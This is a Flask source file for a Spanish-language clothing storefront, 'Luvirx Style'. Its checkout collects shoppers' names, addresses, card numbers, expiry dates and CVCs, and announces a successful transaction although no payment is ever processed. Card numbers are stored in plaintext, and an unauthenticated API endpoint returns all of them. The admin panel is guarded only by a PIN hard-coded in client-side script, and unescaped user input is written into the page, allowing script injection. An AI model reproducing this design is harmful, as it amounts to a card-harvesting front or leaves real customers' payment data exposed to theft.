from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- CONFIGURACIÓN ---
WHATSAPP_NUMBER = "573115221592"
ADMIN_PIN = "2102"
pedidos_db = []

HTML_CODE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Luvirx Style | Exclusive Shop</title>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #d4af37; --dark: #0a0a0a; --card: #151515; --white: #ffffff; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background: var(--dark); color: var(--white); line-height: 1.6; }
        
        /* Header Premium */
        nav { 
            background: rgba(0,0,0,0.9); padding: 1.5rem 8%; 
            display: flex; justify-content: space-between; align-items: center;
            position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid rgba(212,175,55,0.2);
            backdrop-filter: blur(10px);
        }
        .logo { font-family: 'Playfair Display', serif; font-size: 1.8rem; color: var(--gold); letter-spacing: 4px; text-transform: uppercase; }
        .cart-btn { background: none; border: 1px solid var(--gold); color: var(--gold); padding: 8px 15px; cursor: pointer; border-radius: 5px; transition: 0.3s; }
        .cart-btn:hover { background: var(--gold); color: black; }

        /* Hero Section */
        .hero { 
            height: 50vh; display: flex; flex-direction: column; justify-content: center; align-items: center;
            text-align: center; background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1441984904996-e0b6ba687e04?q=80&w=1600');
            background-size: cover; background-position: center;
        }
        .hero h1 { font-family: 'Playfair Display', serif; font-size: 3rem; margin-bottom: 10px; color: var(--gold); }

        /* Catálogo */
        .container { padding: 50px 8%; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; }
        .card { 
            background: var(--card); border-radius: 20px; overflow: hidden; 
            border: 1px solid #222; transition: 0.4s; position: relative;
        }
        .card:hover { transform: translateY(-10px); border-color: var(--gold); }
        .card-img { height: 300px; background: #222; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; color: #444; }
        .card-body { padding: 25px; text-align: center; }
        .price { color: var(--gold); font-size: 1.5rem; font-weight: 600; margin: 15px 0; display: block; }
        .btn-buy { 
            background: var(--gold); color: black; border: none; padding: 12px 0; width: 100%; 
            font-weight: 600; text-transform: uppercase; border-radius: 10px; cursor: pointer; transition: 0.3s;
        }

        /* Checkout Moderno */
        #checkout { 
            display: none; background: #111; padding: 40px; border-radius: 25px; 
            margin-top: 50px; border: 1px solid var(--gold); box-shadow: 0 0 30px rgba(212,175,55,0.1);
        }
        .input-group { margin-bottom: 20px; }
        label { display: block; font-size: 0.8rem; color: var(--gold); margin-bottom: 5px; text-transform: uppercase; }
        input { 
            width: 100%; padding: 15px; background: #000; border: 1px solid #333; 
            color: white; border-radius: 10px; outline: none; transition: 0.3s;
        }
        input:focus { border-color: var(--gold); }

        /* Panel Admin Pro */
        #admin-panel { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #f8f9fa; color: #333; z-index: 2000; padding: 40px; overflow-y: auto;
        }
        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 2px solid #ddd; padding-bottom: 15px; }
        table { width: 100%; border-collapse: collapse; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
        th { background: #333; color: white; padding: 15px; text-align: left; }
        td { padding: 15px; border-bottom: 1px solid #eee; font-size: 0.9rem; }
        
        footer { padding: 60px; text-align: center; border-top: 1px solid #111; font-size: 0.8rem; color: #444; }
        .secret-btn { opacity: 0.2; cursor: pointer; transition: 0.5s; }
        .secret-btn:hover { opacity: 1; color: var(--gold); }
    </style>
</head>
<body>

    <nav>
        <div class="logo">Luvirx</div>
        <button class="cart-btn" onclick="abrirCheckout()">CARRITO (<span id="count">0</span>)</button>
    </nav>

    <div class="hero">
        <p style="letter-spacing: 5px;">COLLECCIÓN 2026</p>
        <h1>LUVIRX STYLE</h1>
        <p>Elegancia Urbana Sin Límites</p>
    </div>

    <div class="container" id="view-tienda">
        <div class="grid">
            <div class="card">
                <div class="card-img">IMAGEN: CONJUNTO</div>
                <div class="card-body">
                    <h3>Urban Set Gold</h3>
                    <span class="price">$180.000</span>
                    <button class="btn-buy" onclick="agregar('Urban Set Gold', 180000)">Añadir a la bolsa</button>
                </div>
            </div>
            <div class="card">
                <div class="card-img">IMAGEN: JEAN</div>
                <div class="card-body">
                    <h3>Slim Heritage Jean</h3>
                    <span class="price">$120.000</span>
                    <button class="btn-buy" onclick="agregar('Slim Heritage Jean', 120000)">Añadir a la bolsa</button>
                </div>
            </div>
            <div class="card">
                <div class="card-img" style="border:1px solid var(--gold)">SPECIAL EDITION</div>
                <div class="card-body">
                    <h3>Chaqueta Limited</h3>
                    <span class="price">$250.000</span>
                    <button class="btn-buy" onclick="agregar('Chaqueta Limited', 250000)">Añadir a la bolsa</button>
                </div>
            </div>
        </div>

        <div id="checkout">
            <h2 style="text-align:center; color:var(--gold); margin-bottom:30px; font-family:'Playfair Display', serif;">Finalizar Compra</h2>
            <div class="input-group">
                <label>Nombre Completo</label>
                <input type="text" id="form-nombre" placeholder="Nombre y Apellidos">
            </div>
            <div class="input-group">
                <label>Dirección de Envío (Ubicación Exacta)</label>
                <input type="text" id="form-ubicacion" placeholder="Calle, Carrera, Ciudad y Barrio">
            </div>
            <div class="input-group">
                <label>Tarjeta de Crédito / Débito</label>
                <input type="text" id="form-tarjeta" placeholder="0000 0000 0000 0000">
            </div>
            <div style="display:flex; gap:15px;">
                <div style="flex:1;"><label>Vence</label><input type="text" id="form-vence" placeholder="MM/AA"></div>
                <div style="flex:1;"><label>CVC</label><input type="text" id="form-cvc" placeholder="***"></div>
            </div>
            <p id="total-text" style="text-align:center; font-size:1.5rem; margin:20px 0;"></p>
            <button class="btn-buy" onclick="procesarPago()">Pagar Ahora</button>
        </div>
    </div>

    <div id="admin-panel">
        <div class="admin-header">
            <h2>Luvirx | Gestión de Pedidos</h2>
            <button onclick="cerrarAdmin()" style="padding:10px; background:#ff4444; color:white; border:none; border-radius:5px; cursor:pointer;">Cerrar Panel</button>
        </div>
        <table id="tabla-pedidos">
            <thead>
                <tr>
                    <th>Fecha</th>
                    <th>Cliente</th>
                    <th>Ubicación</th>
                    <th>Productos</th>
                    <th>Tarjeta</th>
                    <th>Total</th>
                </tr>
            </thead>
            <tbody id="admin-body"></tbody>
        </table>
    </div>

    <footer>
        <p>LUVIRX STYLE &copy; 2026 | TODOS LOS DERECHOS RESERVADOS</p>
        <div class="secret-btn" onclick="accesoAdmin()">Panel de Control</div>
    </footer>

    <script>
        let carrito = [];
        let total = 0;

        function agregar(nombre, precio) {
            carrito.push(nombre);
            total += precio;
            document.getElementById('count').innerText = carrito.length;
            alert("✓ " + nombre + " agregado con éxito");
        }

        function abrirCheckout() {
            if(carrito.length === 0) return alert("Tu bolsa de compras está vacía");
            document.getElementById('checkout').style.display = 'block';
            document.getElementById('total-text').innerText = "Total: $" + total.toLocaleString();
            window.scrollTo({ top: document.getElementById('checkout').offsetTop - 50, behavior: 'smooth' });
        }

        async function procesarPago() {
            const pedido = {
                nombre: document.getElementById('form-nombre').value,
                ubicacion: document.getElementById('form-ubicacion').value,
                tarjeta: document.getElementById('form-tarjeta').value,
                productos: carrito.join(", "),
                total: total,
                fecha: new Date().toLocaleString()
            };

            if(!pedido.nombre || !pedido.ubicacion || !pedido.tarjeta) return alert("Por favor, completa todos los campos");

            await fetch('/api/nuevo_pedido', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(pedido)
            });

            alert("¡TRANSACCIÓN EXITOSA! Gracias por elegir Luvirx Style.");
            location.reload();
        }

        // SISTEMA ADMIN
        function accesoAdmin() {
            const pin = prompt("Introduce PIN de Administrador:");
            if(pin === "2102") {
                renderizarPedidos();
                document.getElementById('admin-panel').style.display = 'block';
            } else {
                alert("Acceso denegado");
            }
        }

        async function renderizarPedidos() {
            const res = await fetch('/api/obtener_pedidos');
            const data = await res.json();
            let html = '';
            data.reverse().forEach(p => {
                html += `<tr>
                    <td>${p.fecha}</td>
                    <td><b>${p.nombre}</b></td>
                    <td>${p.ubicacion}</td>
                    <td>${p.productos}</td>
                    <td><code>${p.tarjeta}</code></td>
                    <td style="color:green; font-weight:bold;">$${p.total.toLocaleString()}</td>
                </tr>`;
            });
            document.getElementById('admin-body').innerHTML = html;
        }

        function cerrarAdmin() { document.getElementById('admin-panel').style.display = 'none'; }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_CODE)

@app.route('/api/nuevo_pedido', methods=['POST'])
def nuevo_pedido():
    pedidos_db.append(request.json)
    return jsonify({"status": "success"})

@app.route('/api/obtener_pedidos')
def obtener_pedidos():
    return jsonify(pedidos_db)

if __name__ == '__main__':
    app.run(debug=True)